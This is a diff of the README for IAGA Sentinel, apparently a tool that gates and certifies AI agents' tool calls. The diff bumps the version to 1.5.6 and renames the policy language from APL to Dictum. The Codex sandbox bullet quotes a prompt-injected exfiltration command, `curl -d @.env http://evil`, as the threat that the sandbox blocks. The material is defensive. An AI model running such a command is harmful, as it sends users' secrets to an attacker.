@@ -9,7 +9,7 @@
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/version-1.5.5-0f9d6b?style=flat-square" alt="version" />
+  <img src="https://img.shields.io/badge/version-1.5.6-0f9d6b?style=flat-square" alt="version" />
   <img src="https://img.shields.io/badge/license-BUSL--1.1-0f9d6b?style=flat-square" alt="license" />
   <img src="https://img.shields.io/badge/EU%20AI%20Act-Art.%2012%20and%20Annex%20IV-0B0F0E?style=flat-square" alt="EU AI Act Article 12 and Annex IV" />
   <img src="https://img.shields.io/badge/Rust-stable-0B0F0E?style=flat-square" alt="Rust" />
@@ -46,7 +46,7 @@ What makes it different:
 - **Proof, not testimony.** Ed25519 + Merkle receipts, verifiable offline with the standalone `iaga-verify` binary: no server, no network, no trust in IAGA required.
 - **Honest posture.** Soft enforcement is stated inside the evidence itself, not buried in a footnote.
 - **Sovereign by construction.** Runs air-gapped; BUSL-1.1 auto-converts to Apache-2.0; the evidence stays in your hands, with no CLOUD Act exposure.
-- **EU AI Act-shaped.** Receipts line up with Article 12 logging; typed APL policies document your risk controls.
+- **EU AI Act-shaped.** Receipts line up with Article 12 logging; typed Dictum policies document your risk controls.
 
 ---
 
@@ -81,7 +81,7 @@ The operator dashboard is at <http://localhost:4010/> the moment the server is u
 
 ---
 
-## Test me now (1.5.5)
+## Test me now (1.5.6)
 
 Do not take our word for it. The repository ships a self-contained demo kit that drives three real verdicts through the live pipeline and proves the receipt offline, on your own machine. Nothing is faked, and you get the same verdicts every run. Two scripts under [`scripts/`](scripts/) and a runbook in [`docs/demo/README.md`](docs/demo/README.md). The primary path is Windows PowerShell; Linux and macOS use the `.sh` twins.
 
@@ -125,7 +125,7 @@ Window layout, captions and a 75 to 100 second timing budget are in [`docs/demo/
 Most integrations **observe**: they ask for a verdict and certify what happened. The OpenAI Codex plug-in is the first that also **acts inside the agent's loop**, adding a third verb to *enforces softly and certifies hard*: **enforces inside the loop**. It is IAGA Sentinel's first **vertical plug-in**: a deep, framework-specific adapter under active development, and its first end-to-end, bidirectional integration.
 
 - **The gate.** Codex's native `PreToolUse` hook routes every tool call through `POST /v1/inspect` before it runs. A `block` verdict stops the action inside Codex (exit 2) and hands the model the policy reason; a signed receipt is minted either way. **Fail-closed by default**: no verdict means the action does not run.
-- **The compiler.** `iaga-codex export-rules` compiles an APL bundle into Codex's **native** execpolicy `.rules`, a static command-prefix layer that holds even when hooks are disabled. Both layers merge strictest-wins.
+- **The compiler.** `iaga-codex export-rules` compiles a Dictum bundle into Codex's **native** execpolicy `.rules`, a static command-prefix layer that holds even when hooks are disabled. Both layers merge strictest-wins.
 - **The ingest.** `iaga-codex ingest` turns a `codex exec --json` session (live from a pipe, a spawned run, or a captured file) into the same signed receipt chain, so even sessions that ran *without* the gate leave verifiable evidence. This is the **advisory** tier: the verdict is recorded, never applied.
 - **The sandbox (Phase 2).** Run Codex under its native OS sandbox and the egress threat closes *below* the model: a prompt-injected `curl -d @.env http://evil` cannot even open the socket, because outbound network is denied by default. The secret never leaves the box even if every cooperative check were stripped out. The gate still attests the attempt; the enforcer here is the OS sandbox, not Sentinel, so the receipt stays honest (`is_authoritative: false`).
 
@@ -139,7 +139,7 @@ This integration spans the full enforcement ladder: **advisory** (ingest: record
 
 ## Documentation
 
-**Everything lives at [www.iaga.tech/docs](https://www.iaga.tech/docs):** the full zero-to-verified-evidence tutorial, framework integrations (LangChain, Claude Code, OpenAI Codex, MCP, and 12 more), the APL policy language, cost control and budgets, API keys and scopes, configuration and environment variables, the production checklist, and troubleshooting.
+**Everything lives at [www.iaga.tech/docs](https://www.iaga.tech/docs):** the full zero-to-verified-evidence tutorial, framework integrations (LangChain, Claude Code, OpenAI Codex, MCP, and 12 more), the Dictum policy language, cost control and budgets, API keys and scopes, configuration and environment variables, the production checklist, and troubleshooting.
 
 In this repository:
 
@@ -154,7 +154,7 @@ In this repository:
 
 ## Community vs Enterprise
 
-This repository is the open build: the source-verifiable evidence core, with signed receipts, offline verification and replay, the APL policy engine, cross-platform soft enforcement, BYOK signing, BYO ONNX reasoning, and cost control. Every claim is reproducible from a clean checkout: `git clone && cargo test --workspace`.
+This repository is the open build: the source-verifiable evidence core, with signed receipts, offline verification and replay, the Dictum policy engine, cross-platform soft enforcement, BYOK signing, BYO ONNX reasoning, and cost control. Every claim is reproducible from a clean checkout: `git clone && cargo test --workspace`.
 
 IAGA Sentinel Enterprise adds managed, platform-specific, and compliance-delivery capabilities: Annex IV dossier generation, qualified signatures, SSO/RBAC/multi-tenancy, native SIEM and KMS integrations, authoritative kernel enforcement, and curated model packages. The public boundary is documented in [ADR 0010](docs/adr/0010-oss-enterprise-boundary.md); the overview is in [`ENTERPRISE.md`](ENTERPRISE.md).
 
@@ -188,12 +188,12 @@ Research-validated, not marketing-validated.
 ## Status
 
 > [!NOTE]
-> **New in 1.5.4: the policy language now enforces what it promised.** The APL `secret_ref()` builtin actually detects credentials and PII inside a tool payload (it was a placeholder that always returned false), and a new `url_host()` builtin gives a policy a real per-host egress allowlist that also defeats look-alike-domain bypasses. Three core fixes ship alongside: the workspace egress allowlist is URL-aware, so a full URL to an allowed host is no longer over-blocked; every `block` or `review` now carries its cause in the audit event and the signed receipt, with no silent escalation; and signed receipts hash-chain across a session, so a multi-step run forms one tamper-evident Merkle chain. See [ADR 0023](docs/adr/0023-apl-secret-detection-host-egress.md) and the [CHANGELOG](CHANGELOG.md).
+> **New in 1.5.6: the policy language is now Dictum.** The typed policy DSL (formerly APL / Agent Policy Language) is renamed to Dictum end to end: the `.dictum` file extension, the `iaga-sentinel-dictum` crate, the `dictum` build feature, and the `dictum[...]` reason recorded on every audit event and signed receipt. The rename is behavior-preserving: the signed-receipt wire format stays byte-identical (the `apl_eval_trace` field is kept), and `iaga-codex export-rules --apl` still works as a hidden alias for the new `--dictum` flag. See [ADR 0004](docs/adr/0004-dictum-mvp.md) and the [CHANGELOG](CHANGELOG.md).
 
 > [!NOTE]
-> **New in 1.5.3: a vertical, in-the-loop plug-in.** The [OpenAI Codex plug-in](#in-the-loop-with-openai-codex) lands as IAGA Sentinel's first end-to-end, bidirectional integration: a `block` verdict stops an action *inside* the agent's loop, and a Phase 2 milestone pairs the gate with Codex's OS sandbox so prompt-injected egress can't even open the socket. Standalone `iaga-codex` binary; the `iaga` core is unchanged. See [ADR 0022](docs/adr/0022-codex-integration.md) and [STATUS.md](examples/integrations/codex/STATUS.md).
+> **New in 1.5.4: the policy language now enforces what it promised.** The Dictum `secret_ref()` builtin actually detects credentials and PII inside a tool payload (it was a placeholder that always returned false), and a new `url_host()` builtin gives a policy a real per-host egress allowlist that also defeats look-alike-domain bypasses. Three core fixes ship alongside: the workspace egress allowlist is URL-aware, so a full URL to an allowed host is no longer over-blocked; every `block` or `review` now carries its cause in the audit event and the signed receipt, with no silent escalation; and signed receipts hash-chain across a session, so a multi-step run forms one tamper-evident Merkle chain. See [ADR 0023](docs/adr/0023-dictum-secret-detection-host-egress.md) and the [CHANGELOG](CHANGELOG.md).
 
-Current release: **1.5.5** ([release notes](CHANGELOG.md)). CI runs the full workspace test suite (default and `--all-features`), live-Postgres receipt tests, SDK end-to-end smokes against a real sidecar, and clippy with `-D warnings`. All green from a clean checkout.
+Current release: **1.5.6** ([release notes](CHANGELOG.md)). CI runs the full workspace test suite (default and `--all-features`), live-Postgres receipt tests, SDK end-to-end smokes against a real sidecar, and clippy with `-D warnings`. All green from a clean checkout.
 
 ---
 
